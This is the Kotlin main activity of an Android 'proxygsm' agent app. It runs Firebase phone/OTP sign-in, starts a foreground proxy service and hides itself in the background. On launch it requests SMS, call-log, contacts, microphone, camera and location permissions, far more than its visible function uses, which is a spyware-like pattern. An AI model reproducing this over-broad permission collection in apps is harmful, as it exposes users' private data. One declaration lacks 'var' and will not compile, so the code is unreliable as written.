package com.proxygsm.agent

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.auth.FirebaseAuth
import com.proxygsm.agent.auth.FirebaseAuthManager
import com.proxygsm.agent.databinding.ActivityMainBinding
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {
    private lateinit binding: ActivityMainBinding
    private lateinit var authManager: FirebaseAuthManager
    
    private val PERMISSIONS_REQUEST_CODE = 1001
    private val REQUIRED_PERMISSIONS = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.POST_NOTIFICATIONS
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        authManager = FirebaseAuthManager()

        setupUI()
        checkPermissions()
    }

    private fun setupUI() {
        binding.btnSignIn.setOnClickListener {
            val phoneNumber = binding.etPhoneNumber.text.toString()
            if (phoneNumber.isEmpty()) {
                Toast.makeText(this, "Enter phone number", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            
            signInWithPhone(phoneNumber)
        }

        binding.btnVerifyOtp.setOnClickListener {
            val otp = binding.etOtp.text.toString()
            if (otp.isEmpty()) {
                Toast.makeText(this, "Enter OTP", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            
            verifyOtp(otp)
        }

        // Check if already authenticated
        if (FirebaseAuth.getInstance().currentUser != null) {
            navigateToHome()
        }
    }

    private fun signInWithPhone(phoneNumber: String) {
        CoroutineScope(Dispatchers.Main).launch {
            authManager.signInWithPhone(this@MainActivity, phoneNumber).fold(
                onSuccess = {
                    binding.otpContainer.visibility = android.view.View.VISIBLE
                    Toast.makeText(this@MainActivity, "OTP sent!", Toast.LENGTH_SHORT).show()
                },
                onFailure = { e ->
                    Toast.makeText(this@MainActivity, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                }
            )
        }
    }

    private fun verifyOtp(otp: String) {
        CoroutineScope(Dispatchers.Main).launch {
            authManager.verifyOtp(otp).fold(
                onSuccess = { user ->
                    Toast.makeText(this@MainActivity, "Signed in: ${user.phoneNumber}", Toast.LENGTH_SHORT).show()
                    navigateToHome()
                },
                onFailure = { e ->
                    Toast.makeText(this@MainActivity, "Verification failed: ${e.message}", Toast.LENGTH_LONG).show()
                }
            )
        }
    }

    private fun navigateToHome() {
        // Start ProxyService
        val serviceIntent = Intent(this, com.proxygsm.agent.services.ProxyService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
        
        // Minimize to background
        moveTaskToBack(true)
    }

    private fun checkPermissions() {
        val permissionsToRequest = REQUIRED_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                PERMISSIONS_REQUEST_CODE
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            val deniedPermissions = permissions.zip(grantResults.toList())
                .filter { it.second != PackageManager.PERMISSION_GRANTED }
                .map { it.first }
            
            if (deniedPermissions.isNotEmpty()) {
                Toast.makeText(
                    this,
                    "Some permissions denied. App may not work correctly.",
                    Toast.LENGTH_LONG
                ).show()
            }
        }
    }
}
